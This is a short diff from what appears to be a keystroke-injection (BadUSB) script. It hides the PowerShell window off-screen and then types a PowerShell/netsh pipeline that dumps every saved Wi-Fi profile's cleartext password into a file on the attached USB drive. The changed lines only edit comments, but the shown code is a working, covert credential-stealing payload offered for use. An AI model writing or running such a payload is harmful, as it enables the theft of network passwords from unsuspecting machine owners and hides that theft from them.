@@ -16,10 +16,11 @@ function hidePS() { //moves powershell window far outside of screeen coords but 
   	press("ENTER");
 }
 function scrapeWiFi() { //scrapes wifi passwords
-	type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'README' } | select name") //gets usb path based on device name
+	type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'README' } | select name") //gets usb path based on device name, README is the packaged in mass storage vaue, add you own or change it if youd like 
   	press("ENTER");
   	type("cd $usbPath.name")
 	press("ENTER");
+	//actual wifi scraping below
   	type('(netsh wlan show profiles) | Select-String "\\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\\W+\\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize >> test.txt')
 	press("ENTER");
   	delay(500);
